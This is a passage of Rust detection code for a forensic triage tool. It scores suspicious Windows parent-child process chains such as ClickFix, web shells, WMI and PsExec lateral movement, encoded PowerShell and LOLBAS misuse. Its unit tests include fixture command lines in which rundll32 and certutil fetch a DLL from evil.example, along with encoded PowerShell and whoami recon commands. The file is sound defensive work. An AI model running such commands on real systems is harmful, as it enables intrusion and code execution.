//! heur_parentchild (FR10, SRS §10): anomalous parent->child, encoded PowerShell,
//! suspicious exec path, unsigned + integrity weighting, built-in LOLBAS-flavored list.
//!
//! Parent->child pairs and what each one means:
//!
//! | Parent | Child | Meaning | ATT&CK |
//! |---|---|---|---|
//! | Office app | shell / script host | malicious macro or document exploit | T1059 |
//! | script host | cmd / PowerShell | malicious .js/.vbs attachment | T1059 |
//! | explorer.exe | mshta.exe | ClickFix (Win+R paste) or double-clicked .hta | T1204.004, T1218.005 |
//! | w3wp / sqlservr / httpd / nginx / Tomcat | cmd / PowerShell / whoami | web shell (xp_cmdshell for SQL Server) | T1505.003 |
//! | wmiprvse.exe | cmd / PowerShell | WMI remote execution | T1047 |
//! | services.exe | cmd.exe writing to `\\127.0.0.1\ADMIN$`, or PSEXESVC | PsExec / Impacket service execution | T1569.002 |
//!
//! Every signal carries its own reason and its own client-facing (zh-TW) sentence;
//! the strongest signal's sentence becomes `Finding.details_client`, so the report
//! never falls back to a generic "masquerade or lateral movement" line.
use crate::score::{severity_for, Score};
use crate::trust::{
    canonical_system_dirs, exe_name, has_base64_token, has_encoded_flag, is_interpreter,
    is_masquerade, is_powershell, is_user_writable_path, launcher_kind, LauncherKind,
};
use cairn_core::finding::EntityProcess;
use cairn_core::record::{ProcessRecord, Record};
use cairn_core::traits::Analyzer;
use cairn_core::{Entity, Finding, FindingSource, Result};
use std::collections::HashMap;

// --- Named rule tables (config-loader seam; see spec) -------------------------

// NOTE: matching is on the normalized exe NAME only (crate::trust::exe_name). A renamed
// binary evades it; the user-writable-path amplifier gives partial path-based coverage.
// Which binaries are shells / script hosts / LOLBins is crate::trust::LAUNCHERS — the
// one table shared with persist, event-log and ClickFix.
/// Parent images whose spawning of a shell is anomalous (Office apps).
pub(crate) const OFFICE_PARENTS: &[&str] = &["winword", "excel", "powerpnt", "outlook"];

/// Web / database servers that should never start a shell: a shell under one of
/// them is a web shell (or xp_cmdshell for SQL Server). Tomcat is matched separately
/// (tomcat*.exe, or java.exe running Catalina).
const WEB_SERVER_PARENTS: &[&str] = &["w3wp", "sqlservr", "httpd", "nginx"];

/// What a web shell typically runs first.
const WEB_SHELL_CHILDREN: &[&str] = &["cmd", "powershell", "pwsh", "whoami"];

/// Impacket wmiexec / smbexec write command output back over the loopback admin share.
fn loopback_admin_share(cmdline: &str) -> Option<&'static str> {
    let lc = cmdline.to_ascii_lowercase();
    if lc.contains(r"\\127.0.0.1\admin$") {
        Some(r"\\127.0.0.1\ADMIN$")
    } else if lc.contains(r"\\127.0.0.1\c$") {
        Some(r"\\127.0.0.1\C$")
    } else {
        None
    }
}

/// True if this parent process is Apache Tomcat (its service exe, or java running
/// Catalina).
fn is_tomcat(exe: &str, cmdline: &str) -> bool {
    if exe.starts_with("tomcat") {
        return true;
    }
    let lc = cmdline.to_ascii_lowercase();
    exe == "java" && (lc.contains("catalina") || lc.contains("tomcat"))
}

/// The directory part of an image path (for reason text).
fn dir_of(image: &str) -> &str {
    image.rsplit_once(['\\', '/']).map_or("", |(d, _)| d)
}

/// Lowercased file name (last path segment, `.exe` kept) of an image path, for
/// reason text.
pub(crate) fn file_name(image: &str) -> String {
    image
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(image)
        .to_ascii_lowercase()
}

/// True if cmdline carries a PowerShell encoded-command flag AND a real base64
/// payload token. `-e` only counts for a PowerShell binary (unrelated tools use `-e`).
pub(crate) fn has_encoded_powershell(exe: &str, cmdline: &str) -> bool {
    has_encoded_flag(cmdline, is_powershell(exe)) && has_base64_token(cmdline)
}

/// A Score plus the client-facing sentence of its strongest signal.
#[derive(Default)]
pub(crate) struct Verdict {
    pub score: Score,
    /// (weight, zh-TW sentence) of the strongest signal that has one.
    client: Option<(u32, String)>,
}

impl Verdict {
    /// Add a primary signal with its own client sentence.
    fn signal(&mut self, weight: u32, reason: String, mitre: &[&str], client: String) {
        self.score.add(weight, reason, mitre);
        if self.client.as_ref().is_none_or(|(w, _)| weight > *w) {
            self.client = Some((weight, client));
        }
    }

    /// Add a signal that sharpens one already raised (same activity, more specific
    /// evidence): its sentence replaces the current one.
    fn refine(&mut self, weight: u32, reason: String, mitre: &[&str], client: String) {
        self.score.add(weight, reason, mitre);
        let top = self.client.as_ref().map_or(0, |(w, _)| *w);
        self.client = Some((top + weight, client));
    }

    /// The client sentence for the report (`Finding.details_client`).
    pub fn client_text(&self) -> Option<&str> {
        self.client.as_ref().map(|(_, t)| t.as_str())
    }
}

/// Score one process against its (optional) parent. Returns a Score (may be empty).
#[cfg(test)]
pub(crate) fn score_process(p: &ProcessRecord, parent: Option<&ProcessRecord>) -> Score {
    evaluate(p, parent).score
}

/// Score one process against its (optional) parent, with the client sentence.
pub(crate) fn evaluate(p: &ProcessRecord, parent: Option<&ProcessRecord>) -> Verdict {
    let mut v = Verdict::default();
    let child_name = file_name(&p.image);
    let child_exe = exe_name(&p.image);
    let child_kind = launcher_kind(&child_exe);
    let parent_name = parent.map(|pp| file_name(&pp.image));
    let parent_exe = parent.map(|pp| exe_name(&pp.image));

    // S3 masquerade (spec §4.2): a protected system name outside its canonical
    // directory is dispositive on its own — no clean machine has an AppData (or
    // C:\Windows\Temp) svchost.exe.
    if is_masquerade(&p.image) {
        let canonical = canonical_system_dirs(&child_name)
            .unwrap_or(&[])
            .iter()
            .map(|d| format!("C:{d}"))
            .collect::<Vec<_>>()
            .join(" or ");
        let dir = dir_of(&p.image);
        v.signal(
            60,
            format!(
                "system binary name {child_name} runs from {dir}, not its canonical \
                 directory {canonical}"
            ),
            &["T1036.005"],
            format!(
                "{child_name} 是 Windows 系統程式的名稱，但這個行程是從 {dir} 執行，\
                 而不是系統目錄 {canonical}。惡意程式常借用系統程式名稱躲避注意，\
                 請確認這個檔案的來源與雜湊值。"
            ),
        );
    }
    if let (Some(pp), Some(pn), Some(pexe)) = (parent, &parent_name, &parent_exe) {
        if OFFICE_PARENTS.contains(&pexe.as_str()) && is_interpreter(&child_exe) {
            v.signal(
                50,
                format!("Office app {pn} spawned shell {child_name} (macro or document exploit)"),
                &["T1059"],
                format!(
                    "Office 程式 {pn} 啟動了 {child_name}。文件本身不應開啟命令列或腳本，\
                     這通常是惡意巨集或文件漏洞的跡象；請確認使用者當時開啟了哪份文件。"
                ),
            );
        }
        // Intentionally only the real shells (not other script hosts): a script host
        // launching cmd/powershell is the suspicious pattern; wscript<->cscript chains
        // are commonly benign.
        if launcher_kind(pexe) == Some(LauncherKind::ScriptHost)
            && child_kind == Some(LauncherKind::Shell)
        {
            v.signal(
                30,
                format!("script host {pn} spawned {child_name}"),
                &["T1059"],
                format!(
                    "腳本程式 {pn} 啟動了 {child_name}，常見於惡意的 .js／.vbs 附件或下載檔；\
                     請確認被執行的腳本檔來源。"
                ),
            );
        }
        // ClickFix: the Run dialog (Win+R) belongs to explorer.exe, so a pasted
        // `mshta https://...` lure shows up as explorer -> mshta.
        if pexe == "explorer" && child_exe == "mshta" {
            v.signal(
                50,
                "explorer.exe started mshta.exe — the ClickFix pattern (a command pasted \
                 into Win+R) or a double-clicked .hta file"
                    .to_string(),
                &["T1204.004", "T1218.005"],
                "使用者介面（explorer.exe）直接啟動了 mshta.exe。假驗證碼或假錯誤頁面\
                 （ClickFix 手法）常要使用者按 Win+R 貼上 mshta 指令來下載惡意程式；\
                 請詢問使用者當時看到什麼畫面，並檢查 mshta 載入的網址或檔案。"
                    .to_string(),
            );
        }
        // Web shell: a web/database server starting a shell or recon tool.
        let web_parent =
            WEB_SERVER_PARENTS.contains(&pexe.as_str()) || is_tomcat(pexe, &pp.cmdline);
        if web_parent && WEB_SHELL_CHILDREN.contains(&child_exe.as_str()) {
            let (reason, client) = if pexe == "sqlservr" {
                (
                    format!("SQL Server (sqlservr.exe) spawned {child_name} — xp_cmdshell or a SQL-injected command"),
                    format!(
                        "SQL Server 資料庫程式啟動了 {child_name}，代表有人透過 xp_cmdshell \
                         等功能從資料庫執行系統指令（常見於 SQL 注入攻擊）；請檢查資料庫\
                         稽核記錄與應用程式的查詢來源。"
                    ),
                )
            } else {
                (
                    format!("web server {pn} spawned {child_name} — web shell behaviour"),
                    format!(
                        "網頁伺服器 {pn} 啟動了 {child_name}。網站程式正常不會開啟命令列，\
                         這是網頁後門（web shell）的典型跡象；請檢查網站目錄中最近新增或\
                         修改的檔案與網站存取記錄。"
                    ),
                )
            };
            v.signal(60, reason, &["T1505.003"], client);
        }
        // WMI remote execution (wmiexec, Invoke-WmiMethod Win32_Process Create).
        if pexe == "wmiprvse" && child_kind == Some(LauncherKind::Shell) {
            v.signal(
                40,
                format!(
                    "WMI provider host wmiprvse.exe spawned {child_name} (WMI command execution)"
                ),
                &["T1047"],
                format!(
                    "WMI 服務（wmiprvse.exe）啟動了 {child_name}，代表有人透過 WMI 在這台主機\
                     執行指令；管理工具（例如 SCCM）會這樣做，攻擊者橫向移動也會。\
                     請確認這個時間是否有授權的管理作業。"
                ),
            );
            if let Some(share) = loopback_admin_share(&p.cmdline) {
                v.refine(
                    30,
                    format!(
                        "{child_name} writes its output to {share} — the Impacket wmiexec pattern"
                    ),
                    &["T1047", "T1021.002"],
                    format!(
                        "WMI 服務啟動的 {child_name} 把執行結果寫到 {share}，這是 Impacket \
                         wmiexec 遠端執行工具的特徵，代表有人從其他電腦以管理員權限在這台\
                         主機執行指令（橫向移動）；請找出來源主機與使用的帳號。"
                    ),
                );
            }
        }
        // Service-based remote execution: PsExec (PSEXESVC) and Impacket smbexec /
        // psexec (services.exe -> cmd.exe writing to the loopback admin share).
        let psexec = (pexe == "services" && child_exe == "psexesvc")
            || (pexe == "psexesvc" && child_kind == Some(LauncherKind::Shell));
        let svc_share = (pexe == "services" && child_exe == "cmd")
            .then(|| loopback_admin_share(&p.cmdline))
            .flatten();
        if psexec || svc_share.is_some() {
            let marker = svc_share.unwrap_or("PSEXESVC");
            v.signal(
                60,
                format!(
                    "{pn} started {child_name} as a service command ({marker}) — PsExec / \
                     Impacket remote service execution"
                ),
                &["T1569.002", "T1021.002"],
                format!(
                    "{pn} 以服務方式啟動了 {child_name}，內容符合 PsExec／Impacket 遠端執行\
                     工具的特徵（{marker}）。這代表有人從其他電腦以管理員權限在這台主機執行\
                     指令（橫向移動）；請找出來源主機與使用的帳號。"
                ),
            );
        }
    }
    if has_encoded_powershell(&child_exe, &p.cmdline) {
        v.signal(
            40,
            "encoded PowerShell command".to_string(),
            &["T1059.001"],
            format!(
                "{child_name} 執行了經過 Base64 編碼的 PowerShell 指令。把指令編碼來隱藏\
                 真正內容是惡意程式常見的手法；請解碼指令內容確認它做了什麼。"
            ),
        );
    }
    if matches!(
        child_kind,
        Some(LauncherKind::ScriptHost | LauncherKind::ProxyExec)
    ) && lolbas_suspicious(&p.cmdline)
    {
        v.signal(
            30,
            format!("LOLBAS {child_name} with suspicious arguments"),
            &["T1218"],
            format!(
                "{child_name} 是 Windows 內建程式，但帶有下載網址、腳本元件或編碼內容等\
                 可疑參數；攻擊者常借用這類內建程式執行惡意內容。請檢查它載入了什麼。"
            ),
        );
    }
    let s = &mut v.score;
    // Suspicious path is an AMPLIFIER (spec §4.2 S8): alone it matches every
    // per-user app (chrome-native-host in \AppData\) — zero information. It adds
    // weight only when a behavioral combo already fired.
    let combo_fired = !s.reasons.is_empty();
    if combo_fired && is_user_writable_path(&p.image) {
        s.add(
            25,
            format!("executes from a suspicious path: {}", p.image),
            &["T1036"],
        );
    }
    // Unsigned amplifier: an unsigned binary is a signal only when ANOTHER suspicion has
    // already fired. catalog-signed OS binaries are reported unsigned by WTD_CHOICE_FILE, so
    // an unconditional unsigned signal would flood every signed-by-catalog system process.
    // Never penalize the unverifiable (None) nor the trusted (Some(true)). proc `signed` is
    // backfilled by the proc collector via WinVerifyTrust (S2-E).
    let another_signal_fired = !s.reasons.is_empty();
    if p.signed == Some(false) && another_signal_fired {
        s.add(20, "binary is unsigned", &[]);
        if matches!(p.integrity.as_deref(), Some("high") | Some("system")) {
            s.add(15, "unsigned binary running at high integrity", &["T1068"]);
        }
    }
    v
}

/// Suspicious argument patterns for a watchlisted LOLBAS binary.
pub(crate) fn lolbas_suspicious(cmdline: &str) -> bool {
    let lc = cmdline.to_ascii_lowercase();
    lc.contains("http") || lc.contains("scrobj") || lc.contains("/i:") || has_base64_token(cmdline)
}

/// Analyzer: scores every process against its parent and emits findings above the floor.
pub struct ParentChildHeuristic;

impl ParentChildHeuristic {
    /// This analyzer's `name()`, also stamped into `Finding.analyzer`.
    pub const NAME: &'static str = cairn_core::analyzers::PARENTCHILD;
}

impl Analyzer for ParentChildHeuristic {
    fn name(&self) -> &str {
        Self::NAME
    }

    fn analyze(&self, records: &[Record], _prior_findings: &[Finding]) -> Result<Vec<Finding>> {
        // Index processes by pid for parent lookup. Known limitation: if a snapshot
        // contains two processes with the same pid (OS pid reuse), the last one wins;
        // a live triage snapshot almost never reuses pids, so this only affects parent
        // attribution accuracy, never correctness/panics.
        let by_pid: HashMap<u32, &ProcessRecord> = records
            .iter()
            .filter_map(|r| match r {
                Record::Process(p) => Some((p.pid, p)),
                _ => None,
            })
            .collect();

        let own_pid = std::process::id();
        let mut out = Vec::new();
        for r in records {
            let Record::Process(p) = r else { continue };
            if p.pid == own_pid {
                continue; // never flag the forensic tool itself
            }
            let parent = by_pid.get(&p.ppid).copied();
            let verdict = evaluate(p, parent);
            let score = &verdict.score;
            let Some(severity) = severity_for(score.weight) else {
                continue;
            };

            let mut f = Finding::new(severity, suspicious_title(p), FindingSource::Heuristic);
            f.reason = Some(score.reasons.join("; "));
            f.mitre = score.mitre.clone();
            f.details_client = verdict.client_text().map(str::to_string);
            f.artifact = "process".into();
            let p_name = p.image.rsplit(['\\', '/']).next().unwrap_or(&p.image);
            f.details = if p.cmdline.is_empty() {
                format!("{} (pid={}, parent={})", p_name, p.pid, p.ppid)
            } else {
                format!(
                    "{} (pid={}, parent={}, cmd={})",
                    p_name, p.pid, p.ppid, p.cmdline
                )
            };
            f.ts = p.start_time.unwrap_or_else(chrono::Utc::now);
            f.entity = Entity {
                process: Some(EntityProcess {
                    pid: p.pid,
                    ppid: p.ppid,
                    image: p.image.clone(),
                    cmdline: p.cmdline.clone(),
                    signed: p.signed,
                    integrity: p.integrity.clone(),
                }),
                ..Entity::default()
            };
            out.push(f);
        }
        Ok(crate::stamped(out, Self::NAME))
    }
}

/// A short title for a flagged process.
fn suspicious_title(p: &ProcessRecord) -> String {
    let name = file_name(&p.image);
    format!("Suspicious process: {name}")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc(pid: u32, ppid: u32, image: &str, cmdline: &str) -> ProcessRecord {
        ProcessRecord {
            pid,
            ppid,
            image: image.into(),
            cmdline: cmdline.into(),
            signed: None,
            signer: None,
            binary_sha256: None,
            integrity: None,
            user: None,
            start_time: None,
            signer_source: None,
        }
    }

    /// Regression: the old base64 check (any 16+ alphanumeric run) fired on the
    /// `WindowsPowerShell` directory name, so every LOLBin-style check saw "base64" in a
    /// plain PowerShell path. A real token is now required.
    #[test]
    fn windows_powershell_path_is_not_base64() {
        let cmd = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File x.ps1";
        assert!(!has_base64_token(cmd));
        assert!(!lolbas_suspicious(cmd));
        assert!(!has_encoded_powershell("powershell", cmd));
        let p = proc(
            10,
            1,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            cmd,
        );
        let explorer = proc(1, 0, r"C:\Windows\explorer.exe", "");
        let s = score_process(&p, Some(&explorer));
        assert_eq!(s.weight, 0, "{:?}", s.reasons);
    }

    /// Office -> encoded PowerShell scores high+ and tags T1059.001.
    #[test]
    fn office_encoded_powershell_scores_high() {
        let parent = proc(100, 4, r"C:\Program Files\Microsoft Office\winword.exe", "");
        let child = proc(
            200,
            100,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let s = score_process(&child, Some(&parent));
        assert!(s.weight >= 50, "weight {} should be high+", s.weight);
        assert!(s.mitre.contains(&"T1059.001".to_string()));
        assert!(s.reasons.iter().any(|r| r.contains("winword.exe")));
    }

    /// A benign explorer -> notepad (signed, normal path) scores 0.
    #[test]
    fn benign_explorer_notepad_scores_zero() {
        let parent = proc(50, 4, r"C:\Windows\explorer.exe", "");
        let mut child = proc(60, 50, r"C:\Windows\System32\notepad.exe", "notepad.exe");
        child.signed = Some(true);
        let s = score_process(&child, Some(&parent));
        assert_eq!(s.weight, 0);
    }

    /// Unsigned binary from Temp with NO parent and no other behavioral signal: under
    /// the path-as-amplifier model, suspicious-path no longer fires without a prior
    /// combo, so the unsigned amplifier (which itself requires a prior signal) also
    /// stays quiet. Total weight is 0 (renamed from `unsigned_from_temp_no_parent_scores`,
    /// which asserted this combination scored >= 45 under the old independent-signal model).
    #[test]
    fn unsigned_temp_alone_gated_out() {
        let mut p = proc(70, 0, r"C:\Users\a\AppData\Local\Temp\evil.exe", "evil.exe");
        p.signed = Some(false);
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(s.reasons.is_empty());
    }

    /// A watchlisted LOLBAS binary with a suspicious http argument scores the LOLBAS
    /// signal (+30, T1218); the same binary with a benign argument does not.
    #[test]
    fn lolbas_http_arg_fires_benign_does_not() {
        let bad = proc(
            300,
            4,
            r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe http://evil.example/x.dll,Entry",
        );
        let s = score_process(&bad, None);
        assert!(s.mitre.contains(&"T1218".to_string()));
        assert!(s.weight >= 30);

        let benign = proc(
            301,
            4,
            r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        );
        let s2 = score_process(&benign, None);
        assert!(
            !s2.mitre.contains(&"T1218".to_string()),
            "benign rundll32 must not fire the LOLBAS signal"
        );
    }

    /// The `-e ` short form only counts for PowerShell binaries: a non-PS tool with
    /// `-e <base64>` must NOT fire the encoded-PowerShell signal.
    #[test]
    fn dash_e_short_form_only_for_powershell() {
        // non-PS binary with -e <base64-looking>: must NOT fire encoded-PS
        let other = proc(
            400,
            4,
            r"C:\tools\curl.exe",
            "curl.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA https://x",
        );
        let s = score_process(&other, None);
        assert!(
            !s.mitre.contains(&"T1059.001".to_string()),
            "-e on a non-PS binary must not be treated as encoded PowerShell"
        );

        // powershell with -e <base64>: DOES fire
        let ps = proc(
            401,
            4,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let s2 = score_process(&ps, None);
        assert!(s2.mitre.contains(&"T1059.001".to_string()));
    }

    /// Suspicious path alone (no prior combo, e.g. LOLBAS) no longer fires under the
    /// path-as-amplifier model, so the unsigned amplifier chained off it also stays
    /// quiet: total weight is 0 (renamed from `unsigned_amplifies_with_suspicious_path`,
    /// which asserted path(25)+unsigned(20)=45 under the old independent-signal model).
    /// A real combo (LOLBAS) + suspicious path + unsigned IS exercised by
    /// `unsigned_high_integrity_amplifies_with_signal` below.
    #[test]
    fn unsigned_and_path_alone_gated_out() {
        let mut p = proc(10, 0, r"C:\Users\a\AppData\Local\Temp\x.exe", "x.exe");
        p.signed = Some(false);
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Unsigned ALONE (normal path, no parent/encoded/LOLBAS): amplifier does NOT fire.
    /// catalog-signed system process (reported unsigned) must stay quiet.
    #[test]
    fn unsigned_alone_does_not_amplify() {
        let mut p = proc(11, 0, r"C:\Windows\System32\svchost.exe", "svchost.exe");
        p.signed = Some(false);
        p.integrity = Some("system".into());
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Unsigned + high integrity WITH a prior behavioral combo (LOLBAS): the combo
    /// fires first, which unlocks BOTH the path amplifier and the unsigned amplifiers
    /// chained after it. (Renamed from `unsigned_high_integrity_amplifies_with_signal`:
    /// the old fixture relied on suspicious-path firing with no prior signal, which the
    /// path-as-amplifier model no longer allows — see `unsigned_and_path_alone_gated_out`
    /// for that now-empty case. This test keeps the same intent — "does the unsigned/
    /// high-integrity chain fire once corroborated?" — using certutil LOLBAS as the
    /// corroborating combo instead; NOT rundll32, which is also a PROTECTED_SYSTEM_NAME
    /// and would additionally fire S3 masquerade, inflating the weight.)
    #[test]
    fn unsigned_high_integrity_amplifies_with_signal() {
        let mut p = proc(
            12,
            0,
            r"C:\Users\a\AppData\Local\Temp\certutil.exe",
            "certutil.exe http://evil.example/x.dll",
        );
        p.signed = Some(false);
        p.integrity = Some("high".into());
        let s = score_process(&p, None);
        // LOLBAS 30 + suspicious path 25 + unsigned 20 + unsigned-high-integrity 15 = 90
        assert_eq!(s.weight, 90);
        assert!(s.reasons.iter().any(|r| r.contains("suspicious path")));
        assert!(s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Signed (Some(true)) with a suspicious path but no prior combo: suspicious-path
    /// no longer fires alone (path-as-amplifier model), so weight is 0 and — a
    /// fortiori — no unsigned amplifier fires either. (Renamed from
    /// `signed_does_not_amplify`, which asserted the old independent path weight of 25;
    /// its core intent, "a signed binary never gets the unsigned amplifier," is
    /// subsumed by `unsigned_high_integrity_amplifies_with_signal`'s signed==Some(false)
    /// vs the None default used throughout this module's other tests.)
    #[test]
    fn signed_with_suspicious_path_alone_gated_out() {
        let mut p = proc(13, 0, r"C:\Users\a\AppData\Local\Temp\x.exe", "x.exe");
        p.signed = Some(true);
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    use cairn_core::record::Record;
    use cairn_core::traits::Analyzer;

    fn rec(p: ProcessRecord) -> Record {
        Record::Process(p)
    }

    /// Own PID must never produce a finding even when the image path is suspicious.
    #[test]
    fn own_process_not_flagged() {
        use std::process;
        let own_pid = process::id();
        let own = Record::Process(proc(
            own_pid,
            4,
            r"C:\Users\x\AppData\Local\cairn-target\release\cairn.exe",
            "",
        ));
        let findings = ParentChildHeuristic.analyze(&[own], &[]).expect("analyze");
        assert!(findings.is_empty(), "own PID must never produce a finding");
    }

    /// A suspicious path alone (no prior behavioral combo) is no longer a finding on
    /// its own under the path-as-amplifier model — even for a different PID than our
    /// own. (Renamed from `other_pid_suspicious_path_still_flagged`, which asserted a
    /// finding fires for suspicious-path-alone under the old independent-signal model.)
    #[test]
    fn suspicious_path_alone_is_not_a_finding() {
        use std::process;
        let own_pid = process::id();
        let other = Record::Process(proc(
            own_pid + 9999,
            4,
            r"C:\Users\x\AppData\Local\cairn-target\release\cairn.exe",
            "",
        ));
        let findings = ParentChildHeuristic
            .analyze(&[other], &[])
            .expect("analyze");
        assert!(
            findings.is_empty(),
            "suspicious path alone must not produce a finding"
        );
    }

    // --- R6: human-readable details field ---

    /// details should contain process name + pid, NOT raw "image=" key-value debug format.
    #[test]
    fn process_details_format() {
        // Use Office-spawns-PowerShell to guarantee a finding above the noise floor.
        let parent = rec(proc(
            100,
            4,
            r"C:\Program Files\Microsoft Office\winword.exe",
            "",
        ));
        let child = rec(proc(
            200,
            100,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        ));
        let findings = ParentChildHeuristic
            .analyze(&[parent, child], &[])
            .expect("analyze");
        assert!(!findings.is_empty(), "should produce at least one finding");
        let details = &findings[0].details;
        // Must contain the process name (last segment of image path).
        assert!(
            details.contains("powershell.exe"),
            "process name missing: {details}"
        );
        // Must contain the PID.
        assert!(
            details.contains("200") || details.contains("pid="),
            "pid missing: {details}"
        );
        // Must NOT use raw debug "image=" or "ppid=" key-value format.
        assert!(
            !details.contains("image="),
            "must not use debug key=value format: {details}"
        );
    }

    /// When cmdline is empty, details omit the cmd= field. Uses the S3 masquerade
    /// signal (dispositive alone) to guarantee a finding without relying on the now-
    /// gated suspicious-path-alone signal (renamed fixture from a bare Temp path,
    /// which under the path-as-amplifier model no longer produces a finding on its
    /// own — see `suspicious_path_alone_is_not_a_finding`).
    #[test]
    fn process_details_no_cmdline_when_empty() {
        let p = rec(proc(
            400,
            4,
            r"C:\Users\a\AppData\Roaming\svchost.exe",
            "", // empty cmdline
        ));
        let findings = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert!(
            !findings.is_empty(),
            "masquerade signal should produce a finding"
        );
        let details = &findings[0].details;
        assert!(
            !details.contains("cmd="),
            "empty cmdline must not produce cmd= field: {details}"
        );
        assert!(
            details.contains("svchost.exe"),
            "binary name missing: {details}"
        );
    }

    /// The analyzer emits one Heuristic finding (with reason + entity) for a malicious
    /// Office->encoded-PS pair, and nothing for a benign process.
    #[test]
    fn analyzer_emits_finding_for_malicious_pair_only() {
        let parent = proc(100, 4, r"C:\...\winword.exe", "");
        let child = proc(
            200,
            100,
            r"C:\...\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let mut benign = proc(60, 50, r"C:\Windows\System32\notepad.exe", "notepad.exe");
        benign.signed = Some(true);
        let recs = vec![rec(parent), rec(child), rec(benign)];

        let findings = ParentChildHeuristic.analyze(&recs, &[]).expect("analyze");
        assert_eq!(findings.len(), 1, "only the malicious child should fire");
        let f = &findings[0];
        assert!(matches!(f.source, cairn_core::FindingSource::Heuristic));
        assert!(f.reason.is_some(), "golden rule 6: reason required");
        assert!(f.entity.process.is_some());
        assert!(f.mitre.contains(&"T1059.001".to_string()));
    }

    /// S3 masquerade fires alone (dispositive, weight 60) and — because it is itself a
    /// fired combo signal — also unlocks the suspicious-path amplifier (+25) for the
    /// same `\AppData\Roaming\` path: 60 + 25 = 85, severity_for(85) = Critical (the
    /// 70.. band). This proves masquerade needs no OTHER corroborating signal to emit
    /// a finding, which is the property under test (severity ends up even higher than
    /// the bare 60 because the path amplifier stacks on top).
    #[test]
    fn masquerade_svchost_in_appdata_fires_high_alone() {
        let p = rec(proc(500, 0, r"C:\Users\a\AppData\Roaming\svchost.exe", ""));
        let findings = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert_eq!(
            findings.len(),
            1,
            "masquerade should produce exactly one finding"
        );
        let f = &findings[0];
        assert_eq!(f.severity, cairn_core::Severity::Critical);
        assert!(f.mitre.contains(&"T1036.005".to_string()));
    }

    fn analyze_pair(parent: ProcessRecord, child: ProcessRecord) -> Vec<Finding> {
        ParentChildHeuristic
            .analyze(&[rec(parent), rec(child)], &[])
            .expect("analyze")
    }

    #[test]
    fn explorer_spawning_mshta_is_clickfix_high() {
        let f = analyze_pair(
            proc(10, 1, r"C:\Windows\explorer.exe", "explorer.exe"),
            proc(
                11,
                10,
                r"C:\Windows\System32\mshta.exe",
                r#""C:\Windows\System32\mshta.exe" C:\Users\a\Downloads\verify.hta"#,
            ),
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, cairn_core::Severity::High);
        assert!(f[0].mitre.contains(&"T1204.004".to_string()));
        assert!(f[0].reason.as_deref().unwrap().contains("ClickFix"));
        let client = f[0].details_client.as_deref().unwrap();
        assert!(client.contains("ClickFix"), "{client}");
        assert!(!client.contains("可能為偽裝或橫向移動"), "{client}");
    }

    #[test]
    fn web_and_database_servers_spawning_shells_are_web_shells() {
        for (parent_img, parent_cmd, child_img) in [
            (
                r"C:\Windows\System32\inetsrv\w3wp.exe",
                "w3wp.exe -ap DefaultAppPool",
                r"C:\Windows\System32\cmd.exe",
            ),
            (
                r"C:\Program Files\Microsoft SQL Server\MSSQL\Binn\sqlservr.exe",
                "sqlservr.exe -sMSSQLSERVER",
                r"C:\Windows\System32\cmd.exe",
            ),
            (
                r"C:\nginx\nginx.exe",
                "nginx.exe",
                r"C:\Windows\System32\whoami.exe",
            ),
            (
                r"C:\Program Files\Apache\Tomcat9\bin\tomcat9.exe",
                "tomcat9.exe //RS//Tomcat9",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ),
            (
                r"C:\Program Files\Java\jre\bin\java.exe",
                "java.exe -classpath bootstrap.jar org.apache.catalina.startup.Bootstrap start",
                r"C:\Windows\System32\cmd.exe",
            ),
        ] {
            let f = analyze_pair(
                proc(20, 1, parent_img, parent_cmd),
                proc(21, 20, child_img, "x /c whoami"),
            );
            assert_eq!(f.len(), 1, "{parent_img}");
            assert_eq!(f[0].severity, cairn_core::Severity::High, "{parent_img}");
            assert!(f[0].mitre.contains(&"T1505.003".to_string()));
            assert!(f[0].details_client.is_some());
        }
        let sql = analyze_pair(
            proc(20, 1, r"C:\SQL\sqlservr.exe", ""),
            proc(21, 20, r"C:\Windows\System32\cmd.exe", "cmd /c whoami"),
        );
        assert!(sql[0].reason.as_deref().unwrap().contains("xp_cmdshell"));
        // a developer's java (not Tomcat) starting cmd is not a web shell
        let dev = analyze_pair(
            proc(
                20,
                1,
                r"C:\Program Files\Java\bin\java.exe",
                "java -jar gradle.jar",
            ),
            proc(21, 20, r"C:\Windows\System32\cmd.exe", "cmd /c build.bat"),
        );
        assert!(dev.is_empty());
    }

    #[test]
    fn wmiprvse_shell_is_t1047_and_wmiexec_output_escalates() {
        let wmi = proc(30, 1, r"C:\Windows\System32\wbem\WmiPrvSE.exe", "");
        let plain = analyze_pair(
            wmi.clone(),
            proc(
                31,
                30,
                r"C:\Windows\System32\cmd.exe",
                "cmd.exe /c ipconfig",
            ),
        );
        assert_eq!(plain.len(), 1);
        assert_eq!(plain[0].severity, cairn_core::Severity::Medium);
